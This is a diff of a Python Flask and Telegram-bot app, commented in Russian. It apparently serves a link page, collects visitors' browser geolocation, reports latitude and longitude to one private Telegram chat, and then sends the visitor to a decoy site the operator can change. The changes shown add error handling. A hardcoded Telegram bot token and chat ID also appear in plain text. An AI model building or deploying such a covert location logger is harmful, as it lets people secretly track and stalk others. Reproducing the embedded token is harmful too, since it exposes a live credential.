@@ -12,9 +12,9 @@ CORS(app)
 BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
 CHAT_ID = 651911888  # Только ты
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(BOT_TOKEN, threaded=True)  # threaded=True — важно
 
-# URL редиректа, который можно менять через бота
+# URL редиректа, можно менять через бота
 redirect_url = "https://yandex.ru"
 
 # 🔁 Роут: отдать HTML
@@ -29,7 +29,10 @@ def receive_location():
     lat = data.get('latitude')
     lon = data.get('longitude')
     if lat and lon:
-        bot.send_message(CHAT_ID, f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}")
+        try:
+            bot.send_message(CHAT_ID, f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}")
+        except Exception as e:
+            print(f"Ошибка при отправке в Telegram: {e}")
         return jsonify({"status": "ok"})
     return jsonify({"status": "error"}), 400
 
@@ -77,8 +80,11 @@ def send_render_link(message):
 
 # === Запуск ===
 def run_bot():
-    bot.remove_webhook()
-    bot.infinity_polling()
+    try:
+        bot.remove_webhook()
+        bot.infinity_polling(skip_pending=True)
+    except Exception as e:
+        print(f"Ошибка при запуске бота: {e}")
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
